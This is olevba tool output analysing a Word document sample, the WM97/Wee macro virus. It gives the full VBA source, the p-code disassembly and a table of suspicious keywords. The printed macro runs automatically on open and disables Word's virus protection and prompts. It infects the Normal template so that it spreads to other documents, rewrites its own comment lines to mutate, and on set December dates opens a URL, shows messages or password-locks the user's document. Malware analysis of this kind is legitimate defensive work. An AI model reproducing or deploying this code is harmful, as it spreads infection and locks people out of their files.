olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'15111784917218163524151117849172181635241511178491721816352415111784917218163524
Randomize
'10554701440054318828096105547014400543188280961055470144005431882809610554701440054318828096
o = 0: x = 0
'229059144095149354081229059144095149354081229059144095149354081229059144095149354081
On Error GoTo 75
'3588448262414962916329358844826241496291632935884482624149629163293588448262414962916329
Options.VirusProtection = Chr(48)
'344139601004130118756344139601004130118756344139601004130118756344139601004130118756
Options.SaveNormalPrompt = Chr(48)
'359580122553139931441359580122553139931441359580122553139931441359580122553139931441
Options.ConfirmConversions = Chr(48)
'115451127961586656841115451127961586656841115451127961586656841115451127961586656841
vx = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'15683263244132495830756156832632441324958307561568326324413249583075615683263244132495830756
nt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'12720778224421307456127207782244213074561272077822442130745612720778224421307456
If nt > 0 And vx > 0 Then GoTo 75
'2032877124115418437241203287712411541843724120328771241154184372412032877124115418437241
If nt = 0 Then
'692257280412363216100692257280412363216100692257280412363216100692257280412363216100
    Set Wee = NormalTemplate.VBProject.VBComponents
'15801817522547455572649158018175225474555726491580181752254745557264915801817522547455572649
    Set host = ActiveDocument.VBProject.VBComponents
'2529435776424019801252943577642401980125294357764240198012529435776424019801
    If Month(Now()) = 12 And Day(Now()) = 23 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.wee.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(87) + Chr(69) + Chr(69)
'1005708122523054778244100570812252305477824410057081225230547782441005708122523054778244
    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'14555903648413091936400145559036484130919364001455590364841309193640014555903648413091936400
    If Month(Now()) = 12 And Day(Now()) = 25 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(87) + Chr(69) + Chr(69)
'9324900468924892635076932490046892489263507693249004689248926350769324900468924892635076
    If Month(Now()) = 12 And Day(Now()) = 26 Then Application.ActiveDocument.Password = "Wee"
'367600094415961692944367600094415961692944367600094415961692944367600094415961692944
    host.Item(Abs(1)).Name = Wee.Item(Abs(1)).Name
'532009772134778520100532009772134778520100532009772134778520100532009772134778520100
    host.Item(Abs(1)).Export Application.StartupPath & System.Version
'48337256254894401600483372562548944016004833725625489440160048337256254894401600
End If
'185891409647854567876185891409647854567876185891409647854567876185891409647854567876
If vx = 0 Then Set Wee = ActiveDocument.VBProject.VBComponents
'406586896005650829584406586896005650829584406586896005650829584406586896005650829584
Wee.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
'427298509448107381681427298509448107381681427298509448107381681427298509448107381681
With Wee.Item(Abs(1)).codemodule
'345156250022564846656345156250022564846656345156250022564846656345156250022564846656
    For j = Chr(49) To Chr(52)
'21077232421571090641210772324215710906412107723242157109064121077232421571090641
    .deletelines Chr(49)
'87415020162277771076874150201622777710768741502016227777107687415020162277771076
    Next j
'23138024044508451025231380240445084510252313802404450845102523138024044508451025
    End With
'946036109295519449849946036109295519449849946036109295519449849946036109295519449849
If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'13933422562526601283801139334225625266012838011393342256252660128380113933422562526601283801
If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 81, "Sub ToolsMarco()"
'1737756697614692833796173775669761469283379617377566976146928337961737756697614692833796
If nt = 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'1309622007695705536225130962200769570553622513096220076957055362251309622007695705536225
With Wee.Item(Abs(1)).codemodule
'53893622528691278225538936225286912782255389362252869127822553893622528691278225
    For j = Chr(50) To Wee.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'18864473104249766416188644731042497664161886447310424976641618864473104249766416
    x = Int(Rnd(414835) * 403989) + 8485
'11220423096121191207184112204230961211912071841122042309612119120718411220423096121191207184
    o = Int(Rnd(298368) * 235865) + 2988
'1024285684932335951684102428568493233595168410242856849323359516841024285684932335951684
    .replaceline j, Chr(39) & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'827350437695404602256827350437695404602256827350437695404602256827350437695404602256
Next j
'2456460636148867081481245646063614886708148124564606361488670814812456460636148867081481
End With
'745841562012316400641745841562012316400641745841562012316400641745841562012316400641
75:
'6025012068139082126864602501206813908212686460250120681390821268646025012068139082126864
If nt <> 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'482601811241075971204482601811241075971204482601811241075971204482601811241075971204
End Sub
'3124480464426737809289312448046442673780928931244804644267378092893124480464426737809289
Sub ViewVBCode()
'611320696935120259216611320696935120259216611320696935120259216611320696935120259216
End Sub 'WM97/Wee by Virus ;)
'1342423648812884764100134242364881288476410013424236488128847641001342423648812884764100
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.bi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10293 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0050 "15111784917218163524151117849172181635241511178491721816352415111784917218163524"
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x005C "10554701440054318828096105547014400543188280961055470144005431882809610554701440054318828096"
' Line #4:
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' Line #5:
' 	QuoteRem 0x0000 0x0054 "229059144095149354081229059144095149354081229059144095149354081229059144095149354081"
' Line #6:
' 	OnError 75 
' Line #7:
' 	QuoteRem 0x0000 0x0058 "3588448262414962916329358844826241496291632935884482624149629163293588448262414962916329"
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0054 "344139601004130118756344139601004130118756344139601004130118756344139601004130118756"
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0054 "359580122553139931441359580122553139931441359580122553139931441359580122553139931441"
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0054 "115451127961586656841115451127961586656841115451127961586656841115451127961586656841"
' Line #14:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St vx 
' Line #15:
' 	QuoteRem 0x0000 0x005C "15683263244132495830756156832632441324958307561568326324413249583075615683263244132495830756"
' Line #16:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nt 
' Line #17:
' 	QuoteRem 0x0000 0x0050 "12720778224421307456127207782244213074561272077822442130745612720778224421307456"
' Line #18:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 75 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0058 "2032877124115418437241203287712411541843724120328771241154184372412032877124115418437241"
' Line #20:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0054 "692257280412363216100692257280412363216100692257280412363216100692257280412363216100"
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Wee 
' Line #23:
' 	QuoteRem 0x0000 0x005C "15801817522547455572649158018175225474555726491580181752254745557264915801817522547455572649"
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #25:
' 	QuoteRem 0x0000 0x004C "2529435776424019801252943577642401980125294357764240198012529435776424019801"
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0012 "http://www.wee.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0058 "1005708122523054778244100570812252305477824410057081225230547782441005708122523054778244"
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x005C "14555903648413091936400145559036484130919364001455590364841309193640014555903648413091936400"
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0058 "9324900468924892635076932490046892489263507693249004689248926350769324900468924892635076"
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Wee"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #33:
' 	QuoteRem 0x0000 0x0054 "367600094415961692944367600094415961692944367600094415961692944367600094415961692944"
' Line #34:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #35:
' 	QuoteRem 0x0000 0x0054 "532009772134778520100532009772134778520100532009772134778520100532009772134778520100"
' Line #36:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #37:
' 	QuoteRem 0x0000 0x0050 "48337256254894401600483372562548944016004833725625489440160048337256254894401600"
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	QuoteRem 0x0000 0x0054 "185891409647854567876185891409647854567876185891409647854567876185891409647854567876"
' Line #40:
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Wee 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0000 0x0054 "406586896005650829584406586896005650829584406586896005650829584406586896005650829584"
' Line #42:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #43:
' 	QuoteRem 0x0000 0x0054 "427298509448107381681427298509448107381681427298509448107381681427298509448107381681"
' Line #44:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #45:
' 	QuoteRem 0x0000 0x0054 "345156250022564846656345156250022564846656345156250022564846656345156250022564846656"
' Line #46:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #47:
' 	QuoteRem 0x0000 0x0050 "21077232421571090641210772324215710906412107723242157109064121077232421571090641"
' Line #48:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x0050 "87415020162277771076874150201622777710768741502016227777107687415020162277771076"
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0000 0x0050 "23138024044508451025231380240445084510252313802404450845102523138024044508451025"
' Line #52:
' 	EndWith 
' Line #53:
' 	QuoteRem 0x0000 0x0054 "946036109295519449849946036109295519449849946036109295519449849946036109295519449849"
' Line #54:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' 	QuoteRem 0x0000 0x005C "13933422562526601283801139334225625266012838011393342256252660128380113933422562526601283801"
' Line #56:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0051 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #57:
' 	QuoteRem 0x0000 0x0058 "1737756697614692833796173775669761469283379617377566976146928337961737756697614692833796"
' Line #58:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #59:
' 	QuoteRem 0x0000 0x0058 "1309622007695705536225130962200769570553622513096220076957055362251309622007695705536225"
' Line #60:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #61:
' 	QuoteRem 0x0000 0x0050 "53893622528691278225538936225286912782255389362252869127822553893622528691278225"
' Line #62:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #63:
' 	QuoteRem 0x0000 0x0050 "18864473104249766416188644731042497664161886447310424976641618864473104249766416"
' Line #64:
' 	LitDI4 0x5473 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x2A15 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St x 
' Line #65:
' 	QuoteRem 0x0000 0x005C "11220423096121191207184112204230961211912071841122042309612119120718411220423096121191207184"
' Line #66:
' 	LitDI4 0x8D80 0x0004 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x9959 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #67:
' 	QuoteRem 0x0000 0x0058 "1024285684932335951684102428568493233595168410242856849323359516841024285684932335951684"
' Line #68:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' 	QuoteRem 0x0000 0x0054 "827350437695404602256827350437695404602256827350437695404602256827350437695404602256"
' Line #70:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	QuoteRem 0x0000 0x0058 "2456460636148867081481245646063614886708148124564606361488670814812456460636148867081481"
' Line #72:
' 	EndWith 
' Line #73:
' 	QuoteRem 0x0000 0x0054 "745841562012316400641745841562012316400641745841562012316400641745841562012316400641"
' Line #74:
' 	LineNum 75 
' 	BoS 0x0000 
' Line #75:
' 	QuoteRem 0x0000 0x0058 "6025012068139082126864602501206813908212686460250120681390821268646025012068139082126864"
' Line #76:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #77:
' 	QuoteRem 0x0000 0x0054 "482601811241075971204482601811241075971204482601811241075971204482601811241075971204"
' Line #78:
' 	EndSub 
' Line #79:
' 	QuoteRem 0x0000 0x0058 "3124480464426737809289312448046442673780928931244804644267378092893124480464426737809289"
' Line #80:
' 	FuncDefn (Sub ViewVBCode())
' Line #81:
' 	QuoteRem 0x0000 0x0054 "611320696935120259216611320696935120259216611320696935120259216611320696935120259216"
' Line #82:
' 	EndSub 
' 	QuoteRem 0x0008 0x0014 "WM97/Wee by Virus ;)"
' Line #83:
' 	QuoteRem 0x0000 0x0058 "1342423648812884764100134242364881288476410013424236488128847641001342423648812884764100"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.wee.com  |URL                                          |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

